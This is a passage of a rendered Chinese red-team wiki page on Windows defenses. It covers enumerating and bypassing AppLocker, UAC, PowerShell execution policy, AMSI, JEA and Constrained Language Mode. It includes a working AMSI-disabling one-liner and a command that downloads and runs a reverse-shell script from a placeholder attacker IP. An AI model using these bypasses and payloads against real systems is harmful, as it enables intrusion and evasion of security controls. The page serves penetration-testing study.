+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/rdp-persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RDP - 持久化 (Persistence)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../persistence/windows-persistence/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows - Persistence (持久化)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_11_5" id="__nav_11_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pivoting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Pivoting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pivoting/network-pivoting-techniques/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    网络内网穿透技术 (Network Pivoting Techniques)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../pivoting/network-pivoting-tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    网络内网穿透工具 (Network Pivoting Tools)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        摘要
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#applocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AppLocker
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#uac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        用户账户控制 (UAC)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dpapi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DPAPI
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Powershell
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Powershell">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#execution-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        执行策略 (Execution Policy)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#amsi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        反恶意软件扫描接口 (AMSI)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jea" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        恰到好处的管理 (JEA)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        受限语言模式 (CLM)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本块与模块日志记录
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#powershell-transcript" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell 成文记录 (Transcript)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#securestring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        安全字符串 (SecureString)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ppl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        受保护进程光 (PPL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-guard" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        凭据守卫 (Credential Guard)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-etw" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows 事件跟踪 (ETW)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        攻击面减少 (ASR)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 防病毒
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 应用程序控制
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-defender_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Defender 防火墙
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-wip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows 信息保护 (WIP)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bitlocker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BitLocker 驱动器加密
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        参考资料
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+	
+                  
+
+
+  
+    <a href="https://github.com/n00o00b/InternalAllTheThings_CN/blob/main/docs/redteam/evasion/windows-defenses.zh.md" title="编辑此页" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/n00o00b/InternalAllTheThings_CN/raw/main/docs/redteam/evasion/windows-defenses.zh.md" title="查看本页的源代码" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="windows-">Windows - 防御</h1>
+<h2 id="_1">摘要</h2>
+<ul>
+<li><a href="#applocker">AppLocker</a></li>
+<li><a href="#user-account-control">用户账户控制 (UAC)</a></li>
+<li><a href="#dpapi">DPAPI</a></li>
+<li><a href="#powershell">Powershell</a><ul>
+<li><a href="#execution-policy">执行策略</a></li>
+<li><a href="#anti-malware-scan-interface">反恶意软件扫描接口 (AMSI)</a></li>
+<li><a href="#just-enough-administration">恰到好处的管理 (JEA)</a></li>
+<li><a href="#constrained-language-mode">受限语言模式 (CLM)</a></li>
+<li><a href="#script-block-and-module-logging">脚本块与模块日志记录</a></li>
+<li><a href="#powershell-transcript">PowerShell 成文记录 (Transcript)</a></li>
+<li><a href="#securestring">安全字符串 (SecureString)</a></li>
+</ul>
+</li>
+<li><a href="#protected-process-light">受保护进程光 (PPL)</a></li>
+<li><a href="#credential-guard">凭据守卫 (Credential Guard)</a></li>
+<li><a href="#event-tracing-for-windows">Windows 事件跟踪 (ETW)</a></li>
+<li><a href="#attack-surface-reduction">攻击面减少 (ASR)</a></li>
+<li><a href="#windows-defender-antivirus">Windows Defender 防病毒</a></li>
+<li><a href="#windows-defender-application-control">Windows Defender 应用程序控制 (WDAC)</a></li>
+<li><a href="#windows-defender-firewall">Windows Defender 防火墙</a></li>
+<li><a href="#windows-information-protection">Windows 信息保护 (WIP)</a></li>
+</ul>
+<h2 id="applocker">AppLocker</h2>
+<blockquote>
+<p>AppLocker 是 Microsoft Windows 中的一项安全功能，它允许管理员控制允许用户在系统上运行哪些应用程序和文件。规则可以基于各种标准，如文件路径、文件发布者或文件哈希，并且可以应用于特定的用户或组。</p>
+</blockquote>
+<ul>
+<li>
+<p>枚举本地生效的 AppLocker 策略</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">PowerView</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-AppLockerPolicy</span> <span class="n">-Effective</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">RuleCollections</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="n">PowerView</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="nb">Get-AppLockerPolicy</span> <span class="n">-effective</span> <span class="n">-xml</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">SrpV2</span><span class="p">\</span><span class="n">Exe</span> <span class="c"># (Keys: Appx, Dll, Exe, Msi and Script)</span>
+</code></pre></div>
+</li>
+<li>
+<p>AppLocker 绕过</p>
+<ul>
+<li>默认情况下，<code>C:\Windows</code> 不会被阻止，且 <code>C:\Windows\Tasks</code> 对任何用户都是可写的</li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">api0cradle/UltimateAppLockerByPassList/Generic-AppLockerbypasses.md</a></li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md">api0cradle/UltimateAppLockerByPassList/VerifiedAppLockerBypasses.md</a></li>
+<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md">api0cradle/UltimateAppLockerByPassList/DLL-Execution.md</a></li>
+<li><a href="https://gist.github.com/api0cradle/95cd51fa1aa735d9331186f934df4df9">api0cradle/AccessChk.bat</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="uac">用户账户控制 (UAC)</h2>
+<p>UAC 代表用户账户控制。它是 Microsoft 在 Windows Vista 中引入的一项安全功能，并存在于 Windows 操作系统的所有后续版本中。UAC 有助于减轻恶意软件的影响，并在允许对系统进行可能影响计算机所有用户的更改之前，通过请求许可或管理员密码来保护用户。</p>
+<ul>
+<li>
+<p>检查 UAC 是否启用</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">REG</span> <span class="n">QUERY</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">EnableLUA</span>
+</code></pre></div>
+</li>
+<li>
+<p>检查 UAC 级别</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">REG</span> <span class="n">QUERY</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">ConsentPromptBehaviorAdmin</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">REG</span> <span class="n">QUERY</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">CurrentVersion</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">System</span><span class="p">\</span> <span class="p">/</span><span class="n">v</span> <span class="n">FilterAdministratorToken</span>
+</code></pre></div>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>EnableLUA</th>
+<th>LocalAccountTokenFilterPolicy</th>
+<th>FilterAdministratorToken</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>/</td>
+<td>/</td>
+<td>无 UAC</td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>/</td>
+<td>无 UAC</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0</td>
+<td>0</td>
+<td>对 RID 500 无 UAC</td>
+</tr>
+<tr>
+<td>1</td>
+<td>0</td>
+<td>1</td>
+<td>对所有人开启 UAC</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>UAC 绕过<ul>
+<li><a href="https://www.elastic.co/guide/en/security/current/bypass-uac-via-sdclt.html">Microsoft 签名的自动提升 (AutoElevated) 二进制文件</a> - <code>msconfig</code>, <code>sdclt.exe</code>, <code>eventvwr.exe</code> 等</li>
+<li><a href="https://github.com/hfiref0x/UACME">hfiref0x/UACME</a> - 击败 Windows 用户账户控制</li>
+<li>
+<p>查找自动提升的进程：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">strings</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="p">*.</span><span class="n">exe</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">I</span> <span class="s2">&quot;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&quot;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="dpapi">DPAPI</h2>
+<p>参考 <a href="https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-dpapi/">InternalAllTheThings/Windows - DPAPI.md</a></p>
+<h2 id="powershell">Powershell</h2>
+<h3 id="execution-policy">执行策略 (Execution Policy)</h3>
+<blockquote>
+<p>PowerShell 执行策略是一个控制系统如何运行脚本的安全功能。它有助于防止未经授权的脚本执行，但它不是一个安全边界——它仅防止意外执行未经签名的脚本。</p>
+</blockquote>
+<ul>
+<li>
+<p>检查当前策略</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-ExecutionPolicy</span>
+</code></pre></div>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>策略</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Restricted</td>
+<td>不允许运行脚本（某些系统中的默认设置）。</td>
+</tr>
+<tr>
+<td>AllSigned</td>
+<td>仅运行经过签名的脚本。</td>
+</tr>
+<tr>
+<td>RemoteSigned</td>
+<td>本地脚本可运行，远程脚本必须经过签名。</td>
+</tr>
+<tr>
+<td>Unrestricted</td>
+<td>运行所有脚本，对远程脚本发出警告。</td>
+</tr>
+<tr>
+<td>Bypass</td>
+<td>无限制；运行所有脚本。</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>Restricted</code>: 阻止执行所有脚本（工作站默认设置）。</li>
+<li>
+<p><code>RemoteSigned</code>: 阻止执行从 Internet 下载的未签名脚本，但允许执行 “本地” 脚本（服务器默认设置）。命令 <code>Unblock-File</code> 可用于移除 Web 标记 (MotW)，使下载的脚本看起来像 “本地” 脚本。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c"># 绕过</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Unblock-File</span> <span class="p">&lt;</span><span class="n">来自_Internet_的文件</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>AllSigned</code>: 阻止所有未签名脚本。这是最安全的选项。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c"># 绕过</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Get-Content</span> <span class="p">.\</span><span class="n">run</span><span class="p">.</span><span class="n">ps1</span> <span class="p">|</span> <span class="nb">Invoke-Expression</span>
+</code></pre></div>
+</li>
+</ul>
+<p>你可以直接运行带 <code>-ep Bypass</code> 选项的 <code>powershell.exe</code>，或者使用内置命令 <code>Set-ExecutionPolicy</code>。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="n">powershell</span> <span class="n">-ep</span> <span class="n">bypass</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span> <span class="n">-Force</span>
+</code></pre></div>
+<h3 id="amsi">反恶意软件扫描接口 (AMSI)</h3>
+<blockquote>
+<p>反恶意软件扫描接口 (AMSI) 是一个 Windows API (应用程序编程接口)，它为应用程序和服务提供了一个统一的接口，以便与系统上安装的任何反恶意软件产品集成。该 API 允许反恶意软件解决方案在运行时扫描文件和脚本，并为应用程序提供了请求扫描特定内容的手段。</p>
+</blockquote>
+<p>查找更多 AMSI 绕过方法：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md">Windows - AMSI Bypass.md</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.Ams&#39;</span><span class="p">+</span><span class="s1">&#39;iUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;am&#39;</span><span class="p">+</span><span class="s1">&#39;siInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPu&#39;</span><span class="p">+</span><span class="s1">&#39;blic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
+</code></pre></div>
+<h3 id="jea">恰到好处的管理 (JEA)</h3>
+<blockquote>
+<p>恰到好处的管理 (JEA) 是 Microsoft Windows Server 中的一项功能，允许管理员根据需要将特定的管理任务委托给非管理用户。JEA 提供了一种安全受控的方式来授予有限的、恰到好处的系统访问权限，同时确保用户无法执行非预期的操作或访问敏感信息。</p>
+</blockquote>
+<p>从 JEA 中跳出：</p>
+<ul>
+<li>列出可用的 cmdlet：<code>command</code></li>
+<li>
+<p>寻找非默认的 cmdlet：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Set-PSSessionConfiguration</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">Start-Process</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">New-Service</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">Add-Computer</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="clm">受限语言模式 (CLM)</h3>
+<p>检查是否处于受限模式：<code>$ExecutionContext.SessionState.LanguageMode</code></p>
+<ul>
+<li>
+<p>使用旧版 Powershell 绕过。Powershell v2 不支持 CLM。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span> <span class="n">-ExecutionPolicy</span> <span class="n">bypass</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-v</span> <span class="n">2</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-command</span> <span class="s2">&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://攻击者_IP/rev.ps1&#39;)&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>当使用 <code>__PSLockDownPolicy</code> 时绕过。只需在路径中的某处放入 "System32"。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># 从环境启用 CLM</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="no">[Environment]</span><span class="p">::</span><span class="n">SetEnvironmentVariable</span><span class="p">(</span><span class="s1">&#39;__PSLockdownPolicy&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="s1">&#39;Machine&#39;</span><span class="p">)</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">Env</span><span class="p">:</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c"># 创建包含你的 “恶意” powershell 命令的 check-mode.ps1</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="nv">$mode</span> <span class="p">=</span> <span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="nb">write-host</span> <span class="nv">$mode</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c"># 简单绕过，在 System32 文件夹内执行</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">check-mode</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="n">ConstrainedLanguage</span>
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">check-mode</span><span class="p">.</span><span class="n">ps1</span>
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="n">FullLanguagge</span>
+</code></pre></div>
+</li>
+<li>
+<p>使用 COM 绕过：<a href="https://gist.githubusercontent.com/xpn/1e9e879fab3e9ebfd236f5e4fdcfb7f1/raw/ceb39a9d5b0402f98e8d3d9723b0bd19a84ac23e/COM_to_registry.ps1">xpn/COM_to_registry.ps1</a></p>
+</li>
+<li>
+<p>使用你自己的 Powershell DLL 绕过：<a href="https://github.com/p3nt4/PowerShdll">p3nt4/PowerShdll</a> &amp; <a href="https://github.com/iomoath/PowerShx">iomoath/PowerShx</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="p">&lt;</span><span class="n">脚本</span><span class="p">&gt;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-h</span>      <span class="n">显示此消息</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">路径</span><span class="p">&gt;</span>       <span class="n">运行作为参数传递的脚本</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-w</span>      <span class="n">在新窗口中启动交互式控制台</span><span class="err">（</span><span class="n">默认</span><span class="err">）</span>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">rundll32</span> <span class="n">PowerShdll</span><span class="p">,</span><span class="n">main</span> <span class="n">-i</span>      <span class="n">在此控制台中启动交互式控制台</span>
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-e</span>                           <span class="p">&lt;</span><span class="n">要运行的</span> <span class="nb">PS </span><span class="n">脚本</span><span class="p">&gt;</span>
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">路径</span><span class="p">&gt;</span>                    <span class="n">运行作为参数传递的脚本</span>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="o">-f</span> <span class="p">&lt;</span><span class="n">路径</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">PS_Cmdlet</span><span class="p">&gt;</span>     <span class="n">加载脚本并运行</span> <span class="nb">PS </span><span class="n">cmdlet</span>
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-w</span>                           <span class="n">在新窗口中启动交互式控制台</span>
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="n">rundll32</span> <span class="n">PowerShx</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span><span class="n">main</span> <span class="n">-i</span>                           <span class="n">启动交互式控制台</span>
